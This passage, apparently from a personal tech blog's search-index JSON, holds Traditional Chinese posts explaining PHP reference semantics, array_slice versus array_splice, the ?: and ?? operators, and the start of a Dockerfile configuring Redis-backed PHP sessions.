StdClass;</span><br><span class=\"line\">foo($c-&gt;d);</span><br><span class=\"line\">var_dump(property_exists($c, <span class=\"string\">'d'</span>)); <span class=\"comment\">// bool(true)</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"官方下面的範例\"><a href=\"#官方下面的範例\" class=\"headerlink\" title=\"官方下面的範例\"></a>官方下面的範例</h2><p><strong><em>以下有毒，假如理解不能請不要再深入，有可能會走火入魔</em></strong><br><strong><em>以下有毒，假如理解不能請不要再深入，有可能會走火入魔</em></strong><br><strong><em>以下有毒，假如理解不能請不要再深入，有可能會走火入魔</em></strong></p>\n<p>目前簡單用我想的方法<br><code>沒有用&amp;</code>當做<code>copy覆蓋到當前(箭頭)位置的值</code><br><code>用&amp;</code>當作<code>這個變數(箭頭)重新指向到某一個位置</code>(跟 linux hard link 一樣)<br>以下注解是我用自已方法去記錄的，有錯誤也請不要見怪</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//if you do:</span></span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"string\">\"hihaha\"</span>;</span><br><span class=\"line\">$b = &amp;$a;</span><br><span class=\"line\">$c = <span class=\"string\">\"eita\"</span>;</span><br><span class=\"line\">$b = $c;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a; <span class=\"comment\">// shows \"eita\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># $b指向為$a位置，$b的位置改當然$a也會跟著換</span></span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"string\">\"hihaha\"</span>;</span><br><span class=\"line\">$b = &amp;$a;</span><br><span class=\"line\">$c = <span class=\"string\">\"eita\"</span>;</span><br><span class=\"line\">$b = &amp;$c;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a; <span class=\"comment\">// shows \"hihaha\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  **這邊是重點**</span></span><br><span class=\"line\"><span class=\"comment\">#  $b範例都是參照位置</span></span><br><span class=\"line\"><span class=\"comment\">#  其實很容易被Java Reference帶著走</span></span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"string\">\"hihaha\"</span>;</span><br><span class=\"line\">$b = &amp;$a;</span><br><span class=\"line\">$b = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a; <span class=\"comment\">// shows nothing (both are set to null)</span></span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"string\">\"hihaha\"</span>;</span><br><span class=\"line\">$b = &amp;$a;</span><br><span class=\"line\"><span class=\"keyword\">unset</span>($b);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a; <span class=\"comment\">// shows \"hihaha\"</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>2019-02-20 簡單小記<br><code>$b</code>值為=右邊變數的值(先不管有沒有&amp;)<br>當然不一樣的結果在於前面的<code>$b=&amp;</code></p>\n<h2 id=\"用自已的方法手畫上面前四個範例\"><a href=\"#用自已的方法手畫上面前四個範例\" class=\"headerlink\" title=\"用自已的方法手畫上面前四個範例\"></a>用自已的方法手畫上面前四個範例</h2><img src=\"/blog/2019/01/28/PHP有關參照-Reference-的那些事/1-1.png\" title=\"範例1\">\n<img src=\"/blog/2019/01/28/PHP有關參照-Reference-的那些事/1-2.png\" title=\"範例2\">\n<img src=\"/blog/2019/01/28/PHP有關參照-Reference-的那些事/1-3.png\" title=\"範例3\">\n<img src=\"/blog/2019/01/28/PHP有關參照-Reference-的那些事/1-4.png\" title=\"範例4\">\n<p>簡單來說，我有一個方法不會搞混<br>首先，分兩部份<br>第一部份是 變數名字<br>第二部份是 記錄框框資料<br>兩個部份會有一個箭頭做關連</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = <span class=\"number\">1</span>;</span><br><span class=\"line\">$b = $a;</span><br></pre></td></tr></table></figure>\n<p>平常給值是<br><img src=\"/blog/2019/01/28/PHP有關參照-Reference-的那些事/1-5.png\" title=\"範例5\"></p>\n<h2 id=\"PHP5-new-物件預設是參照\"><a href=\"#PHP5-new-物件預設是參照\" class=\"headerlink\" title=\"PHP5 new 物件預設是參照\"></a>PHP5 new 物件預設是參照</h2><p><code>自 PHP 5 起，new 自动返回引用，因此在此使用 =&amp; 已经过时了并且会产生 E_STRICT 级别的消息。</code></p>\n<h2 id=\"Global-變數使用參照\"><a href=\"#Global-變數使用參照\" class=\"headerlink\" title=\"Global 變數使用參照\"></a>Global 變數使用參照</h2><p>百思不得其解的範例，官方有說明<code>global $var; 是 $var =&amp; $GLOBALS[&#39;var&#39;]; 的簡寫。</code><br>但要熟悉上面規則，就能理解下方程式為什麼不會影響外面的<code>$var2</code>(全域變數)<br>這可能沒有深入了解 PHP 參照，可能會很難理解<br>下範例外面的 Global 使用參照，卻不會影響全域變數</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$var1 = <span class=\"string\">\"Example variable\"</span>;</span><br><span class=\"line\">$var2 = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">global_references</span><span class=\"params\">($use_globals)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $var1, $var2;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$use_globals) &#123;</span><br><span class=\"line\">        $var2 =&amp; $var1; <span class=\"comment\">// visible only inside the function</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'var2:'</span>  . $var2 . <span class=\"string\">','</span> . $GLOBALS[<span class=\"string\">\"var2\"</span>]. PHP_EOL;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        $GLOBALS[<span class=\"string\">\"var2\"</span>] =&amp; $var1; <span class=\"comment\">// visible also in global context</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">global_references(<span class=\"keyword\">false</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"var2 is set to '$var2'\\n\"</span>; <span class=\"comment\">// var2 is set to ''</span></span><br><span class=\"line\">global_references(<span class=\"keyword\">true</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"var2 is set to '$var2'\\n\"</span>; <span class=\"comment\">// var2 is set to 'Example variable'</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>這個範例其實跟上一個例子一樣<br>其實他是參照到別的地方</p>\n<p>話說我剛好也不是很了解 php global<br>趁這個機會了解</p>\n<p><a href=\"http://php.net/manual/en/language.references.arent.php\" target=\"_blank\" rel=\"noopener\">PHP: What References Are Not - Manual</a><br>原 function 的$var是參照$bar<br>但是$var =&amp; $GLOBALS[“baz”];<br>簡單來說</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">(&amp;$var)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $var =&amp; $GLOBALS[<span class=\"string\">\"baz\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo($bar);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>這邊用 global 感覺容易混淆</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">        <span class=\"comment\">//Enter your code here, enjoy!</span></span><br><span class=\"line\">$bar = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">(&amp;$var)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $a = <span class=\"number\">2</span>;</span><br><span class=\"line\">    $var =&amp; $a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo($bar);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $bar;  <span class=\"comment\">#1</span></span><br></pre></td></tr></table></figure>\n<p>感覺<code>foo(&amp;$var)</code>使用上等於<code>區域變數 $var = &amp; 全域變數 $bar</code>($var = &amp;$GLOBAL[‘bar’])<br>所以到最後重新指向位置並不會影響\\$bar</p>\n<h2 id=\"Returning-References\"><a href=\"#Returning-References\" class=\"headerlink\" title=\"Returning References\"></a>Returning References</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">foo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $value = <span class=\"number\">42</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> &amp;<span class=\"title\">getValue</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> foo;</span><br><span class=\"line\">$myValue = &amp;$obj-&gt;getValue(); <span class=\"comment\">// $myValue is a reference to $obj-&gt;value, which is 42.</span></span><br><span class=\"line\">$obj-&gt;value = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $myValue;                <span class=\"comment\">// prints the new value of $obj-&gt;value, i.e. 2.</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>簡單來說，Returning References 用在物件導向需要兩個<code>&amp;</code></p>\n<p>最近看 Codeigiter 原程式有用<code>function &amp;xxxx</code><br>一直在想這個為什麼要這樣用…<br>在想是不是之後會帶入到 function，防止不是參照(以下自己猜測，但後來想想好像不是，看看就好= =a)<br>讓 functiont 產生<code>Only variables should be passed by reference</code>(詳細請看下面內容)<br>不過有在官網看到<a href=\"http://php.net/manual/zh/language.variables.scope.php#language.variables.scope.static\" target=\"_blank\" rel=\"noopener\">PHP: 變量範圍 - Manual</a><br>目前還不確定是不是這個關係</p>\n<blockquote>\n<p>在 Zend 引擎 1 代，它驅動了 PHP4，對於變量的 static 和 global 定義是以引用的方式實現的。例如，在一個函數域內部用 global 語句導入的一個真正的全局變量實際上是建立了一個到全局變量的引用。這有可能導致預料之外的行為，如以下例子所演示的：</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 類似的行為也適用於 static 語句。引用並不是靜態地存儲的：</span></span><br><span class=\"line\"><span class=\"comment\">//以下code為php4</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> &amp;<span class=\"title\">get_instance_ref</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> $obj;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Static object: '</span>;</span><br><span class=\"line\">    var_dump($obj);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($obj)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 將一個引用賦值給靜態變量</span></span><br><span class=\"line\">        $obj = &amp;<span class=\"keyword\">new</span> stdclass;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $obj-&gt;property++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $obj;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> &amp;<span class=\"title\">get_instance_noref</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> $obj;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Static object: '</span>;</span><br><span class=\"line\">    var_dump($obj);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($obj)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 將一個對象賦值給靜態變量</span></span><br><span class=\"line\">        $obj = <span class=\"keyword\">new</span> stdclass;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $obj-&gt;property++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $obj;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$obj1 = get_instance_ref();</span><br><span class=\"line\">$still_obj1 = get_instance_ref();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">$obj2 = get_instance_noref();</span><br><span class=\"line\">$still_obj2 = get_instance_noref();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>官網還有提到一個可能會遇到的錯誤問題</p>\n<ul>\n<li><a href=\"https://my.oschina.net/wangyongtao/blog/531812\" target=\"_blank\" rel=\"noopener\">[PHP]Only variables should be passed by reference - 王永濤的个人页面 - 开源中国</a></li>\n<li><a href=\"https://vijayasankarn.wordpress.com/2017/08/28/php-only-variables-should-be-passed-by-reference/\" target=\"_blank\" rel=\"noopener\">PHP: Only variables should be passed by reference – James’ Desk</a></li>\n</ul>\n<p>首先先提提<code>array_push(array(), &#39;foo&#39;);</code>，程式會顯示錯誤，原因需要這個變數被實例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> &amp;<span class=\"title\">collector</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">static</span> $collection = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $collection;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array_push(collector(), <span class=\"string\">'foo'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>假如</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">collector</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">static</span> $collection = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $collection;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">array_push(collector(), <span class=\"string\">'foo'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>程式會顯示 <code>Only variables should be passed by reference</code></p>\n<h2 id=\"Passing-by-Reference\"><a href=\"#Passing-by-Reference\" class=\"headerlink\" title=\"Passing by Reference\"></a>Passing by Reference</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">(&amp;$var)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $var++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a=<span class=\"number\">5</span>;</span><br><span class=\"line\">foo($a);</span><br><span class=\"line\"><span class=\"comment\">// $a is 6 here</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>官網有給之前提過的錯誤，<code>Only variables should be passed by reference</code>問題</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">(&amp;$var)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $var++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span><span class=\"params\">()</span> // <span class=\"title\">Note</span> <span class=\"title\">the</span> <span class=\"title\">missing</span> &amp;</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $a = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(bar()); <span class=\"comment\">// Produces fatal error as of PHP 5.0.5, strict standards notice</span></span><br><span class=\"line\">            <span class=\"comment\">// as of PHP 5.1.1, and notice as of PHP 7.0.0</span></span><br><span class=\"line\"></span><br><span class=\"line\">foo($a = <span class=\"number\">5</span>); <span class=\"comment\">// Expression, not variable</span></span><br><span class=\"line\">foo(<span class=\"number\">5</span>); <span class=\"comment\">// Produces fatal error</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Foobar</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo(<span class=\"keyword\">new</span> Foobar()) <span class=\"comment\">// Produces a notice as of PHP 7.0.7</span></span><br><span class=\"line\">                  <span class=\"comment\">// Notice: Only variables should be passed by reference</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Unsetting-References\"><a href=\"#Unsetting-References\" class=\"headerlink\" title=\"Unsetting References\"></a>Unsetting References</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = <span class=\"number\">1</span>;</span><br><span class=\"line\">$b =&amp; $a;</span><br><span class=\"line\"><span class=\"keyword\">unset</span>($a);</span><br><span class=\"line\">var_dump($a); <span class=\"comment\"># null</span></span><br><span class=\"line\">var_dump($b); <span class=\"comment\"># 1</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>won’t unset $b, just $a.<br>Again, it might be useful to think about this as analogous to the Unix <strong>unlink</strong> call.</p>\n</blockquote>\n<p>用 Linux 的 link hard 觀念確實方便理解</p>\n<h2 id=\"Spotting-References\"><a href=\"#Spotting-References\" class=\"headerlink\" title=\"Spotting References\"></a>Spotting References</h2><h3 id=\"global-References\"><a href=\"#global-References\" class=\"headerlink\" title=\"global References\"></a>global References</h3><blockquote>\n<p>When you declare a variable as global \\$var you are in fact creating reference to a global variable. That means, this is the same as:</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$var =&amp; $GLOBALS[<span class=\"string\">\"var\"</span>];</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>This also means that unsetting \\$var won’t unset the global variable.</p>\n</blockquote>\n<p>意思是 unset 變數也不會影響到全域變數</p>\n<h3 id=\"this\"><a href=\"#this\" class=\"headerlink\" title=\"\\$this\"></a>\\$this</h3><p>In an object method, \\$this is always a reference to the called object.</p>\n<p>\\$this 參照呼叫實例物件</p>\n<h2 id=\"心得\"><a href=\"#心得\" class=\"headerlink\" title=\"心得\"></a>心得</h2><p>費很多功夫整理這個，光吸收可能需要花費一堆時間<br>因為想進入 PHP 領域，了解這個應該也是必經之道<br>平常也很少機會用<code>&amp;</code>這玩意吧<br>有空整理一下 PHP 物件導向觀念。</p>\n","categories":["PHP"],"tags":["php"]},{"title":"PHP的array_slice與array_splice差別","url":"/blog/2018/05/14/PHP%E7%9A%84array-slice%E8%88%87array-splice%E5%B7%AE%E5%88%A5/","content":"<h2 id=\"回傳值\"><a href=\"#回傳值\" class=\"headerlink\" title=\"回傳值\"></a>回傳值</h2><p><code>array_slice</code>回傳是提取出來陣列<br><code>array_splice</code>回傳是提取出來陣列</p>\n<p>看來return 出來東西都是一樣</p>\n<h2 id=\"帶進度array參數\"><a href=\"#帶進度array參數\" class=\"headerlink\" title=\"帶進度array參數\"></a>帶進度array參數</h2><ul>\n<li><code>array array_slice</code> ( array $array , int $offset [, int $length = NULL [, bool $preserve_keys = FALSE ]] )</li>\n<li><code>array array_splice</code> ( array <code>&amp;</code>$input , int $offset [, int $length = count($input) [, mixed $replacement = array() ]] )</li>\n</ul>\n<p>會發現上面兩者回傳都一樣，但帶進去陣列參數執行結果不一樣</p>\n<p>array_splice大致上跟JavaScript的splice一樣</p>\n<h2 id=\"結論\"><a href=\"#結論\" class=\"headerlink\" title=\"結論\"></a>結論</h2><p>兩者最大不同是一個call by reference一個call by value<br>怎麼看呢?看文件上面有個<code>&amp;</code></p>\n<p>PHP Object好像也是call by reference(address)</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/12932529/why-array-slice-and-array-splice-doing-the-same\" target=\"_blank\" rel=\"noopener\">php - why array_slice() and array_splice() doing the same? - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/3585966/php-how-to-cut-my-array/3585995#3585995\" target=\"_blank\" rel=\"noopener\">PHP: how to ‘cut’ my array? - Stack Overflow</a></li>\n<li><a href=\"http://php.net/manual/en/language.oop5.references.php\" target=\"_blank\" rel=\"noopener\">PHP: Objects and references - Manual</a></li>\n<li><a href=\"http://www.techug.com/post/10-things-not-to-do-in-php-7.html\" target=\"_blank\" rel=\"noopener\">10件在PHP7中不要做的事情 | 程序师</a></li>\n</ul>\n","categories":["PHP"],"tags":["PHP","array","JavaScript","splice","slice"]},{"title":"PHP的三元運算子(?:)跟null運併運算子(??)差別","url":"/blog/2019/01/05/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/","content":"<p>最近發現 PHP 有兩個運算子<code>?:</code>和<code>??</code><br>這兩個看起來用途很像<br>但我覺得一定有什麼不一樣的地方<br>這邊就簡單記錄他們的差別</p>\n<a id=\"more\"></a>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"?:\"></a>?:</h2><p>首先，先介紹這個符號，有些別的程式語言也可以用這個<br>他有專門中文名稱叫「三元運算子」<br>我還有一篇看他他叫貓王運算子?!!!<br>原來是<code>?:</code>反過來看很像貓王 XDD<br>詳細：<a href=\"https://qiita.com/vc7/items/5519b3721377362d7c1d\" target=\"_blank\" rel=\"noopener\">貓王運算子 - Elvis Operator - Qiita</a></p>\n<p>官方文件敘述<a href=\"http://php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary\" target=\"_blank\" rel=\"noopener\">PHP: 比较运算符 - Manual - 三元運算符 </a></p>\n<blockquote>\n<p>表達式 (expr1) ? (expr2) : (expr3) 在 expr1 求值為 TRUE 時的值為 expr2，在 expr1 求值為 FALSE 時的值為 expr3。<br>自 PHP 5.3 起，可以省略三元運算符中間那部分。表達式 expr1 ?: expr3 在 expr1 求值為 TRUE 時返回 expr1，否則返回 expr3。</p>\n</blockquote>\n<h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"??\"></a>??</h2><p>這個是我同事跟我說 PHP7.0 才可以支援使用<br>簡單看了一下介紹，感覺跟<code>?:</code>很像<br>但是不知道差別在哪<br>其實官方文件伈得很清楚<a href=\"http://php.net/manual/zh/migration70.new-features.php#migration70.new-features.null-coalesce-op\" target=\"_blank\" rel=\"noopener\">PHP: 新特性 - Manual - null 合併運算符</a></p>\n<blockquote>\n<p>由於日常使用中存在大量同時使用三元表達式和 isset()的情況， 我們添加了 null 合併運算符 (??) 這個語法糖。如果變量存在且值不為 NULL， 它就會返回自身的值，否則返回它的第二個操作</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// Fetches the value of $_GET['user'] and returns 'nobody'</span></span><br><span class=\"line\"><span class=\"comment\">// if it does not exist.</span></span><br><span class=\"line\">$username = $_GET[<span class=\"string\">'user'</span>] ?? <span class=\"string\">'nobody'</span>;</span><br><span class=\"line\"><span class=\"comment\">// This is equivalent to:</span></span><br><span class=\"line\">$username = <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'user'</span>]) ? $_GET[<span class=\"string\">'user'</span>] : <span class=\"string\">'nobody'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Coalesces can be chained: this will return the first</span></span><br><span class=\"line\"><span class=\"comment\">// defined value out of $_GET['user'], $_POST['user'], and</span></span><br><span class=\"line\"><span class=\"comment\">// 'nobody'.</span></span><br><span class=\"line\">$username = $_GET[<span class=\"string\">'user'</span>] ?? $_POST[<span class=\"string\">'user'</span>] ?? <span class=\"string\">'nobody'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>這樣來看，在<code>??</code>使用上會比<code>?:</code>來的方便，但缺點是只有在 PHP7.0 專案才能使用</p>\n<h2 id=\"簡單總結\"><a href=\"#簡單總結\" class=\"headerlink\" title=\"簡單總結\"></a>簡單總結</h2><p>其實，這兩個都非常接近，<code>??</code>在沒有宣告的時候不會發生錯誤，<code>?:</code>會發生錯誤。<br>但這兩個就算了解，不常使用下也很容易忘記跟部習慣…<br>我後來發現這種跟<a href=\"https://malagege.github.io/blog/2018/07/19/mysql-COALESCE-%E5%8F%96%E4%BB%A3null%E5%80%BC%E5%A5%BD%E6%96%B9%E6%B3%95/\">mysql COALESCE 取代 null 值好方法 | 程式狂想筆記</a>有點像<br>當<code>??</code>為 null 時候就用後面的變數<code>??</code>，這個跟<code>COALESCE</code>有異曲同工之妙<br>所以用 SQL 這個觀念來記真的比較輕鬆</p>\n<h2 id=\"簡單實測紀錄\"><a href=\"#簡單實測紀錄\" class=\"headerlink\" title=\"簡單實測紀錄\"></a>簡單實測紀錄</h2><img src=\"/blog/2019/01/05/PHP的三元運算子-跟null運併運算子-差別/1.jpg\">\n<img src=\"/blog/2019/01/05/PHP的三元運算子-跟null運併運算子-差別/2.jpg\">\n","categories":["PHP"],"tags":["php"]},{"title":"PHP設定session為redis方法(Dockerfile)","url":"/blog/2019/04/13/PHP%E8%A8%AD%E5%AE%9Asession%E7%82%BAredis%E6%96%B9%E6%B3%95-Dockerfile/","content":"<p>最近 PHP 要設定 redis<br>不過這一快真的不是很熟<br>所以 GOOGLE 有找一下設定方法<br>這邊整理</p>\n<a id=\"more\"></a>\n<h2 id=\"PHP-session-吃-redis-Dockerfile\"><a href=\"#PHP-session-吃-redis-Dockerfile\" class=\"headerlink\" title=\"PHP session 吃 redis (Dockerfile)\"></a>PHP session 吃 redis (Dockerfile)</h2><figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> php:<span class=\"number\">7.1</span>-fpm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apt-get update &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  apt-get install unzip wget -y &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  <span class=\"built_in\">cd</span> /tmp &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  wget https://github.com/phpredis/phpredis/archive/master.zip -O phpredis.zip &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  unzip -o /tmp/phpredis.zip &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  mv /tmp/phpredis-* /tmp/phpredis &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  <span class=\"built_in\">cd</span> /tmp/phpredis &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  phpize &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  ./configure &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  make &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  make install &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  mkdir -p /etc/php5/mods-available/ &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  touch /etc/php5/mods-available/redis.ini &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  <span class=\"built_in\">echo</span> extension=redis.so &gt; /etc/php5/mods-available/redis.ini &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  ln -s /etc/php5/mods-available/redis.ini /usr/<span class=\"built_in\">local</span>/etc/php/conf.d &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"session.save_handler = 